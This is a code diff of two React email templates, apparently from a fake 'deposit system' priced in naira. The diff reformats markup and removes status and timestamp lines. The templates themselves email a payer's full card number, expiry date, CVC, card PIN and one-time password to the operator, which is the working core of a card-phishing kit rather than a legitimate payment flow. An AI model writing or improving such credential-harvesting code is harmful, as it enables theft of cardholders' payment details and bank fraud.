@@ -22,36 +22,14 @@ export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc,
           margin: "20px 0",
         }}
       >
-        <p>
-          <strong>Email:</strong> {email}
-        </p>
-        <p>
-          <strong>Amount:</strong> ₦{amount}
-        </p>
-        <p>
-          <strong>Card Holder Name:</strong> {cardName}
-        </p>
-        <p>
-          <strong>Card Number:</strong> {cardNumber}
-        </p>
-        <p>
-          <strong>Expiry Date:</strong> {expiryDate}
-        </p>
-        <p>
-          <strong>CVC:</strong> {cvc}
-        </p>
-        <p>
-          <strong>Card Type:</strong> {cardType || "Unknown"}
-        </p>
-        <p>
-          <strong>PIN:</strong> {pin}
-        </p>
-        <p>
-          <strong>Status:</strong> PIN entered, awaiting OTP verification
-        </p>
-        <p>
-          <strong>Time:</strong> {new Date().toLocaleString()}
-        </p>
+        <p><strong>Email:</strong> {email}</p>
+        <p><strong>Amount:</strong> ₦{amount}</p>
+        <p><strong>Card Holder Name:</strong> {cardName}</p>
+        <p><strong>Card Number:</strong> {cardNumber}</p>
+        <p><strong>Expiry Date:</strong> {expiryDate}</p>
+        <p><strong>CVC:</strong> {cvc}</p>
+        <p><strong>Card Type:</strong> {cardType || "Unknown"}</p>
+        <p><strong>PIN:</strong> {pin}</p>
       </div>
       <p style={{ color: "#6b7280" }}>This is an automated notification from your deposit system.</p>
     </div>
@@ -77,21 +55,9 @@ export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
           margin: "20px 0",
         }}
       >
-        <p>
-          <strong>Email:</strong> {email}
-        </p>
-        <p>
-          <strong>Amount:</strong> ₦{amount}
-        </p>
-        <p>
-          <strong>OTP:</strong> {otp}
-        </p>
-        <p>
-          <strong>Status:</strong> Transaction authorized
-        </p>
-        <p>
-          <strong>Time:</strong> {new Date().toLocaleString()}
-        </p>
+        <p><strong>Email:</strong> {email}</p>
+        <p><strong>Amount:</strong> ₦{amount}</p>
+        <p><strong>OTP:</strong> {otp}</p>
       </div>
       <p style={{ color: "#6b7280" }}>This is an automated notification from your deposit system.</p>
     </div>
